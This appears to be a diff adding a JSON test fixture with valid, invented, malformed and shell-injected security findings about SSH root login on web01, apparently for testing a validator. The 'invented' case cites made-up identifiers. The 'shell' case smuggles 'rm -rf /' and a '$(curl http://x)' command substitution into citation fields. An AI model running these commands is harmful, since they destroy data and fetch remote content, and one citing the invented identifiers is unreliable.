@@ -1,0 +1,21 @@
+{
+  "valid": {
+    "risk": "Root can log in directly over SSH on web01, so one stolen password gives full control with no record of who used it. Disable direct root login and require named accounts with sudo.",
+    "impact": "An attacker with root on web01 could alter or stop the services the ship depends on.",
+    "plan": "Apply the vetted fix 'Disable SSH root login' after an authorised operator approves it.",
+    "citations": ["RHEL-09-255045", "V-257985", "ssg:sshd_disable_root_login"]
+  },
+  "invented": {
+    "risk": "Root can log in directly over SSH. Disable it.",
+    "impact": "Full compromise of web01 is possible.",
+    "plan": "Apply the vetted fix after approval.",
+    "citations": ["RHEL-09-255045", "CVE-2099-0001", "RHEL-09-999999"]
+  },
+  "invalid": "Sure! Here is the explanation you asked for, root login is bad.",
+  "shell": {
+    "risk": "Root login is enabled. Disable it.",
+    "impact": "Compromise of web01.",
+    "plan": "Apply the fix after approval.",
+    "citations": ["rm -rf / ; RHEL-09-255045", "$(curl http://x) V-257985"]
+  }
+}
